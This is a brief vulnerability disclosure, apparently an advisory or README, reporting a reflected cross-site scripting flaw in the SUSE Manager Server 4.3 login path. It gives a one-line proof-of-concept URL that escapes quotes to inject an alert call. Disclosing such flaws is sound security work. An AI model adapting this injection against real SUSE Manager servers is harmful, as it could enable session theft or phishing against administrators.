# suse-manager Reflective xss

## suse-manager introduction

True open source infrastructure management solutions are designed to simplify and secure your entire hybrid Linux environment - at the core, on the edge, or in the cloud. Maintain infrastructure security and compliance of any size (from 10 to 1 million clients) from a single console.

## Vulnerability description

You can use 'escape quotes in the /rhn/manager/login path to create reflective xss

## Impact version

SUSE Manager Server 4.3.*

## poc:

https://ip.com/rhn/manager/login'-alert(1)-'
